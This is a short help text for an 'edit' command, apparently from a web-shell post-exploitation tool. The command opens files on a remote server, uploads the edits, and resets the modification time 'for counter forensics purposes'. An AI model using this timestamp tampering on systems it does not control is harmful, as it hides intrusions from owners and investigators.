"""Print a file content to standard output

SYNOPSIS:
    edit <REMOTE FILE>

DESCRIPTION:
    This command is an enhancement of the 'cat' plugin. Instead
    of simply writing the content to standard output, it opens
    the remote file content with your prefered text editor,
    which if defined by the EDITOR setting.
    - Once opened with the local text editor, the file can be
    edited. When leaving the text editor, the plugin checks if
    the content has changed, and automatically uploads the new
    file content to the remote server.
    - The plugin will automatically try to reset file modification
    time ot it previous value, for counter forensics purposes.

EXAMPLES:
    > edit ../includes/connect.inc.php
      - Open the file with the EDITOR
